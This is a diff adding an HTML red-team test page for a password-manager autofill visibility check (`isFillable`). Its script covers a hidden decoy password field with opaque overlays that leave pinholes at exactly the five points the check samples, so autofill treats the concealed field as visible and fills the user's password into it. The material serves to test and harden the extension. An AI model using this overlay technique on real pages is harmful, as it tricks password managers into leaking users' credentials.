@@ -1,0 +1,59 @@
+<!-- attempts (RT-EXT red team): game the hit test of `isFillable`, which samples five fixed points
+     of a field (the centre and the four points inset by a quarter of the width and height) and asks
+     `elementFromPoint` whether the field is on top there. An opaque overlay that leaves 4 x 4 px
+     holes at exactly those five points (computed from the decoy's own box) covers the decoy for the
+     user while every sample point still hits the field. The overlay takes pointer events, so the
+     `pointer-events: none` limit of the docs does not apply. The visible username and password
+     above are the real form; the decoy is in the same form and asks for the current password too. -->
+<!doctype html>
+<meta charset="utf-8">
+<title>Pinhole overlay</title>
+<script src="/_leaks.js"></script>
+<style>
+  body { margin: 8px; }
+  .row { margin: 4px 0; }
+  #decoy { position: absolute; left: 8px; top: 200px; width: 300px; height: 40px; box-sizing: border-box; }
+  .cover { position: fixed; background: #1d4ed8; z-index: 10; }
+</style>
+<form id="login" onsubmit="return false">
+  <div class="row"><input id="user" name="username" type="text" autocomplete="username"></div>
+  <div class="row"><input id="pass" name="password" type="password" autocomplete="current-password"></div>
+  <input id="decoy" name="d0" type="password" autocomplete="current-password">
+</form>
+<script>
+  const HOLE = 2; // half the side of a hole
+  const box = document.getElementById("decoy").getBoundingClientRect();
+  const dx = box.width / 4;
+  const dy = box.height / 4;
+  const cx = box.left + box.width / 2;
+  const cy = box.top + box.height / 2;
+  const rows = [
+    { y: box.top + dy, xs: [box.left + dx, box.right - dx] },
+    { y: cy, xs: [cx] },
+    { y: box.bottom - dy, xs: [box.left + dx, box.right - dx] },
+  ];
+  const cover = (left, top, right, bottom) => {
+    if (right - left <= 0 || bottom - top <= 0) return;
+    const div = document.createElement("div");
+    div.className = "cover";
+    div.style.left = `${left}px`;
+    div.style.top = `${top}px`;
+    div.style.width = `${right - left}px`;
+    div.style.height = `${bottom - top}px`;
+    document.body.append(div);
+  };
+  // Bands between the hole rows are covered whole; a hole row is covered between its holes.
+  let y = box.top;
+  for (const row of rows) {
+    cover(box.left, y, box.right, row.y - HOLE);
+    let x = box.left;
+    for (const hole of row.xs) {
+      cover(x, row.y - HOLE, hole - HOLE, row.y + HOLE);
+      x = hole + HOLE;
+    }
+    cover(x, row.y - HOLE, box.right, row.y + HOLE);
+    y = row.y + HOLE;
+  }
+  cover(box.left, y, box.right, box.bottom);
+  window.__holes = rows.flatMap((row) => row.xs.map((x) => ({ x, y: row.y })));
+</script>
